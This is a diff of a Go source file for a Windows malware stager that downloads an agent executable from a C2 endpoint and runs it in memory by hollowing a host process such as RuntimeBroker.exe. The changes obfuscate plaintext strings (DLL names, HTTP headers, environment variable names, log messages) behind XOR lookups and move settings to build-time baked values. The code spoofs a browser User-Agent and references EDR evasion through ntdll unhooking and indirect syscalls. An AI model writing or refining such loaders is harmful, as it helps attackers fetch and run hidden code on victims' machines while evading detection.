@@ -1,10 +1,8 @@
-// Multi-stage stager: fetch agent PE from C2 over HTTPS and run it in memory
-// via process hollowing. No payload file ever touches disk.
+// Multi-stage stager: fetch agent PE from the C2 stage endpoint and run it in
+// memory via process hollowing. No payload file ever touches disk.
 //
-// Lab defaults:
-//   C2_STAGE_URL   https://127.0.0.1:8443/stage/agent   (malleable via C2_STAGE_PATH)
-//   STAGE_INSECURE=1  (self-signed lab cert; set 0 for CDN/valid certs)
-//   TARGET_HOST    C:\Windows\System32\RuntimeBroker.exe (hollowing host)
+// Config precedence: environment variables (see xor.go) > values baked at
+// build time by scripts/bake_loader_secrets.go.
 //
 // Build (c-shared DLL used by WMI/MSI):
 //   CC=x86_64-w64-mingw32-gcc CGO_ENABLED=1 GOOS=windows GOARCH=amd64 \
@@ -27,36 +25,36 @@ import (
 	"unsafe"
 )
 
-const defaultHostProc = `C:\Windows\System32\RuntimeBroker.exe`
+func defaultHostProc() string { return xob(eHostProc) }
 
 var (
-	modKernel32H               = syscall.NewLazyDLL("kernel32.dll")
-	modNtdllH                  = syscall.NewLazyDLL("ntdll.dll")
-	procCreateProcessWH        = modKernel32H.NewProc("CreateProcessW")
-	procGetThreadContextH      = modKernel32H.NewProc("GetThreadContext")
-	procSetThreadContextH      = modKernel32H.NewProc("SetThreadContext")
-	procResumeThreadH          = modKernel32H.NewProc("ResumeThread")
-	procVirtualAllocExH        = modKernel32H.NewProc("VirtualAllocEx")
-	procWriteProcessMemoryH    = modKernel32H.NewProc("WriteProcessMemory")
-	procCloseHandleH           = modKernel32H.NewProc("CloseHandle")
-	procCreateRemoteThreadH    = modKernel32H.NewProc("CreateRemoteThread")
-	procVirtualProtectExH      = modKernel32H.NewProc("VirtualProtectEx")
-	procLoadLibraryWH          = modKernel32H.NewProc("LoadLibraryW")
-	procGetProcAddressH        = modKernel32H.NewProc("GetProcAddress")
-	procGetModuleHandleWH      = modKernel32H.NewProc("GetModuleHandleW")
-	procNtUnmapViewOfSectionH  = modNtdllH.NewProc("NtUnmapViewOfSection")
-	procWaitForSingleObjectH   = modKernel32H.NewProc("WaitForSingleObject")
-	procCreateFileWH           = modKernel32H.NewProc("CreateFileW")
+	modKernel32H              = syscall.NewLazyDLL(xob(eKernel32))
+	modNtdllH                 = syscall.NewLazyDLL(xob(eNTDLLName))
+	procCreateProcessWH       = modKernel32H.NewProc("CreateProcessW")
+	procGetThreadContextH     = modKernel32H.NewProc("GetThreadContext")
+	procSetThreadContextH     = modKernel32H.NewProc("SetThreadContext")
+	procResumeThreadH         = modKernel32H.NewProc("ResumeThread")
+	procVirtualAllocExH       = modKernel32H.NewProc("VirtualAllocEx")
+	procWriteProcessMemoryH   = modKernel32H.NewProc("WriteProcessMemory")
+	procCloseHandleH          = modKernel32H.NewProc("CloseHandle")
+	procCreateRemoteThreadH   = modKernel32H.NewProc("CreateRemoteThread")
+	procVirtualProtectExH     = modKernel32H.NewProc("VirtualProtectEx")
+	procLoadLibraryWH         = modKernel32H.NewProc("LoadLibraryW")
+	procGetProcAddressH       = modKernel32H.NewProc("GetProcAddress")
+	procGetModuleHandleWH     = modKernel32H.NewProc("GetModuleHandleW")
+	procNtUnmapViewOfSectionH = modNtdllH.NewProc("NtUnmapViewOfSection")
+	procWaitForSingleObjectH  = modKernel32H.NewProc("WaitForSingleObject")
+	procCreateFileWH          = modKernel32H.NewProc("CreateFileW")
 )
 
 const (
-	CREATE_SUSPENDED       = 0x00000004
-	INFINITE               = 0xFFFFFFFF
-	CONTEXT_AMD64          = 0x00100000
-	CONTEXT_FULL           = CONTEXT_AMD64 | 0x10007
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
-	PAGE_EXECUTE_READWRITE = 0x40
+	CREATE_SUSPENDED        = 0x00000004
+	INFINITE                = 0xFFFFFFFF
+	CONTEXT_AMD64           = 0x00100000
+	CONTEXT_FULL            = CONTEXT_AMD64 | 0x10007
+	MEM_COMMIT              = 0x1000
+	MEM_RESERVE             = 0x2000
+	PAGE_EXECUTE_READWRITE  = 0x40
 	IMAGE_REL_BASED_HIGHLOW = 3
 	IMAGE_REL_BASED_DIR64   = 10
 )
@@ -69,109 +67,100 @@ type processInformation struct {
 }
 
 type startupInfo struct {
-	cb             uint32
-	lpReserved     *uint16
-	lpDesktop      *uint16
-	lpTitle        *uint16
-	dwX            uint32
-	dwY            uint32
-	dwXSize        uint32
-	dwYSize        uint32
-	dwXCountChars  uint32
-	dwYCountChars  uint32
+	cb              uint32
+	lpReserved      *uint16
+	lpDesktop       *uint16
+	lpTitle         *uint16
+	dwX             uint32
+	dwY             uint32
+	dwXSize         uint32
+	dwYSize         uint32
+	dwXCountChars   uint32
+	dwYCountChars   uint32
 	dwFillAttribute uint32
-	dwFlags        uint32
-	wShowWindow    uint16
-	cbReserved2    uint16
-	lpReserved2    *byte
-	hStdInput      uintptr
-	hStdOutput     uintptr
-	hStdErr        uintptr
+	dwFlags         uint32
+	wShowWindow     uint16
+	cbReserved2     uint16
+	lpReserved2     *byte
+	hStdInput       uintptr
+	hStdOutput      uintptr
+	hStdErr         uintptr
 }
 
 type contextAMD64 struct {
-	P1Home        uint64
-	P2Home        uint64
-	P3Home        uint64
-	P4Home        uint64
-	P5Home        uint64
-	P6Home        uint64
-	ContextFlags  uint32
-	MxCsr         uint32
-	SegCs         uint16
-	SegDs         uint16
-	SegEs         uint16
-	SegFs         uint16
-	SegGs         uint16
-	SegSs         uint16
-	EFlags        uint32
-	Dr0           uint64
-	Dr1           uint64
-	Dr2           uint64
-	Dr3           uint64
-	Dr6           uint64
-	Dr7           uint64
-	Rax           uint64
-	Rcx           uint64
-	Rdx           uint64
-	Rbx           uint64
-	Rsp           uint64
-	Rbp           uint64
-	Rsi           uint64
-	Rdi           uint64
-	R8            uint64
-	R9            uint64
-	R10           uint64
-	R11           uint64
-	R12           uint64
-	R13           uint64
-	R14           uint64
-	R15           uint64
-	Rip           uint64
+	P1Home       uint64
+	P2Home       uint64
+	P3Home       uint64
+	P4Home       uint64
+	P5Home       uint64
+	P6Home       uint64
+	ContextFlags uint32
+	MxCsr        uint32
+	SegCs        uint16
+	SegDs        uint16
+	SegEs        uint16
+	SegFs        uint16
+	SegGs        uint16
+	SegSs        uint16
+	EFlags       uint32
+	Dr0          uint64
+	Dr1          uint64
+	Dr2          uint64
+	Dr3          uint64
+	Dr6          uint64
+	Dr7          uint64
+	Rax          uint64
+	Rcx          uint64
+	Rdx          uint64
+	Rbx          uint64
+	Rsp          uint64
+	Rbp          uint64
+	Rsi          uint64
+	Rdi          uint64
+	R8           uint64
+	R9           uint64
+	R10          uint64
+	R11          uint64
+	R12          uint64
+	R13          uint64
+	R14          uint64
+	R15          uint64
+	Rip          uint64
 }
 
 func stageURL() string {
-	if v := os.Getenv("C2_STAGE_URL"); v != "" && !strings.HasPrefix(v, "{{") {
+	if v := os.Getenv(xob(eEnvStageURL)); v != "" {
 		return v
 	}
-	p := "{{C2_STAGE_URL}}"
-	if strings.HasPrefix(p, "{{") {
-		return ""
-	}
-	return p
+	return bakedStageURL()
 }
 
 func stageAuthToken() string {
-	if v := os.Getenv("STAGE_AUTH_TOKEN"); v != "" && !strings.HasPrefix(v, "{{") {
+	if v := os.Getenv(xob(eEnvStageToken)); v != "" {
 		return v
 	}
-	p := "{{STAGE_AUTH_TOKEN}}"
-	if strings.HasPrefix(p, "{{") || p == "" {
-		return ""
-	}
-	return p
+	return bakedStageToken()
 }
 
 func stageInsecure() bool {
-	if v := os.Getenv("STAGE_INSECURE"); v != "" {
+	if v := os.Getenv(xob(eEnvStageInsecure)); v != "" {
 		return v != "0" && strings.ToLower(v) != "false"
 	}
-	p := "{{STAGE_INSECURE}}"
-	if strings.HasPrefix(p, "{{") {
-		return true
+	p := bakedStageInsecure()
+	if p == "" {
+		return true // lab self-signed cert by default
 	}
 	return p == "1" || strings.EqualFold(p, "true")
 }
 
 func hostProc() string {
-	if v := os.Getenv("TARGET_HOST"); v != "" && !strings.HasPrefix(v, "{{") {
+	if v := os.Getenv(xob(eEnvTargetHost)); v != "" {
 		return v
 	}
-	p := "{{TARGET_HOST}}"
-	if strings.HasPrefix(p, "{{") || p == "" {
-		return defaultHostProc
+	if p := bakedTargetHost(); p != "" {
+		return p
 	}
-	return p
+	return defaultHostProc()
 }
 
 // stageFetch downloads the raw PE payload from the C2 stage endpoint.
@@ -185,10 +174,10 @@ func stageFetch(url string, insecure bool) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-	req.Header.Set("Accept", "*/*")
+	req.Header.Set(xob(eHdUA), xob(eUA))
+	req.Header.Set(xob(eHdAccept), xob(eHdAny))
 	if tok := stageAuthToken(); tok != "" {
-		req.Header.Set("X-Auth-Token", tok)
+		req.Header.Set(xob(eHdAuth), tok)
 	}
 	resp, err := client.Do(req)
 	if err != nil {
@@ -217,13 +206,13 @@ func createSuspendedProcess(imagePath string) (*processInformation, error) {
 	}
 	// Redirect the guest's stderr/stdout to a log file so Go runtime fatal
 	// errors (which print to stderr before ExitProcess) are not lost.
-	logPath, _ := syscall.UTF16PtrFromString(`C:\Users\pc_1m\guest_stderr.txt`)
+	logPath, _ := syscall.UTF16PtrFromString(xob(eLabLog))
 	si := &startupInfo{
-		cb:          uint32(unsafe.Sizeof(startupInfo{})),
-		dwFlags:     0x100, // STARTF_USESTDHANDLES
-		hStdInput:   ^uintptr(0),
-		hStdOutput:  ^uintptr(0),
-		hStdErr:     ^uintptr(0),
+		cb:         uint32(unsafe.Sizeof(startupInfo{})),
+		dwFlags:    0x100, // STARTF_USESTDHANDLES
+		hStdInput:  ^uintptr(0),
+		hStdOutput: ^uintptr(0),
+		hStdErr:    ^uintptr(0),
 	}
 	sa := &securityAttributes{nLength: uint32(unsafe.Sizeof(securityAttributes{})), bInheritHandle: 1}
 	hFile, _, e := procCreateFileWH.Call(
@@ -321,9 +310,9 @@ func (r *ReflectiveLoader) hollow(pi *processInformation) (uintptr, error) {
 
 	delta := uint64(base) - preferredBase
 	if delta != 0 {
-	if err := applyRelocationsRemote(pi.ProcessHandle, base, f, r.Image, delta); err != nil {
-		return 0, err
-	}
+		if err := applyRelocationsRemote(pi.ProcessHandle, base, f, r.Image, delta); err != nil {
+			return 0, err
+		}
 	}
 	if err := r.fixImportsRemote(pi.ProcessHandle, base, f); err != nil {
 		return 0, err
@@ -577,7 +566,7 @@ func hollowRun(payload []byte) error {
 	if rr, _, e := procResumeThreadH.Call(pi.ThreadHandle); rr == 0xFFFFFFFF {
 		return fmt.Errorf("ResumeThread: %v", e)
 	}
-	fmt.Fprintf(os.Stderr, "loader stager: hollow OK host=%s pid=%d entry=0x%x\n", host, pi.ProcessID, entry)
+	fmt.Fprintf(os.Stderr, xob(eDiagHollowOK), host, pi.ProcessID, entry)
 	return nil
 }
 
@@ -587,16 +576,16 @@ func runStage() error {
 	if url == "" {
 		return fmt.Errorf("no stage url")
 	}
-	fmt.Fprintf(os.Stderr, "loader stager: fetching %s\n", url)
+	fmt.Fprintf(os.Stderr, xob(eDiagFetch), url)
 	payload, err := stageFetch(url, stageInsecure())
 	if err != nil {
 		return err
 	}
 	// Best-effort evasion init (hash resolution + ntdll unhook + syscall numbers).
 	if err := InitEvasion(); err != nil {
-		fmt.Fprintf(os.Stderr, "loader stager: evasion init failed (%v) — using plain APIs\n", err)
+		fmt.Fprintf(os.Stderr, xob(eDiagEvasionInit), err)
 	} else {
-		fmt.Fprintf(os.Stderr, "loader stager: evasion ready (indirect syscalls=%v)\n", ev.Ready)
+		fmt.Fprintf(os.Stderr, xob(eDiagEvasionReady), ev.Ready)
 	}
 	switch stageMode() {
 	case "stomp":
